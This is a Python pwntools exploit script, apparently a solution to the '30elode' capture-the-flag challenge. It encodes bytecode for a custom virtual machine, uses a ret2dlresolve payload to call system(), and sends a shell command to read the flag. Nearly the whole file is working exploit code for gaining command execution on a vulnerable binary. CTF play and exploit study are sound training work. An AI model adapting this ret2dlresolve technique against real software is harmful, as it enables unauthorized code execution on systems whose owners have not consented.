from pwn import *

exe = ELF("./30elode")

context.binary = exe

HOST = "30elode.challs.olicyber.it"
PORT = 38301

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

OP_ADD = 0x0
OP_SUB = 0x1
OP_MUL = 0x2
OP_DIV = 0x3
OP_AND = 0x4
OP_OR =  0x5
OP_XOR = 0x6
OP_SHL = 0x7
OP_SHR = 0x8
OP_PUSH = 0x9
OP_POP = 0xa
OP_MOV = 0xb
OP_SAVE = 0xc
OP_RESTORE = 0xd
OP_SET = 0xe

SIZE_IMM_8 = 0x0
SIZE_IMM_16 = 0x1
SIZE_REG = 0x2

def binary(opcode, src, dst):
    return (p8(opcode) + p8(src << 4 | dst)).ljust(4, b"\x00")

def push_imm_8(imm):
    return (p8(OP_PUSH) + p8(SIZE_IMM_8) + p8(imm)).ljust(4, b"\x00")

def push_imm_16(imm):
    return p8(OP_PUSH) + p8(SIZE_IMM_16) + p16(imm)

def push_imm_32(imm):
    return push_imm_16(imm >> 16) + push_imm_16(imm & 0xffff)
    
def push_imm_64(imm):
    return push_imm_32(imm >> 32) + push_imm_32(imm & 0xffffffff)
    
def push_reg(reg):
    return p8(OP_PUSH) + p8(SIZE_REG) + p16(reg)

def pop(reg):
    return (p8(OP_POP) + p8(reg)).ljust(4, b"\x00")

def save():
    return p8(OP_SAVE).ljust(4, b"\x00")

def restore():
    return p8(OP_RESTORE).ljust(4, b"\x00")

def set(imm, reg):
    return p8(OP_SET) + p16(imm) + p8(reg)

def build_payload():
    LEAK_OFFSET = 0x1cfe
    PLT_INIT = exe.get_section_by_name(".plt").header.sh_addr

    dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["palle"], data_addr=exe.symbols.regs)

    payload = restore()
    payload += set(LEAK_OFFSET - PLT_INIT, 0) + binary(OP_SUB, 12, 0)
    payload += set(dlresolve.reloc_index, 11) + save()

    for i in range(0, len(dlresolve.payload) - len(dlresolve.payload) % 8, 8):
        payload += push_imm_64(u64(dlresolve.payload[i : i + 8])) + pop(i // 8)
        
    return payload + b"cat flag >&2"

def main():
    payload = build_payload()
    r = conn()
    
    r.sendlineafter(b": ", str(len(payload)).encode())
    r.sendafter(b": ", payload)

    r.interactive()
    
if __name__ == "__main__":
    main()
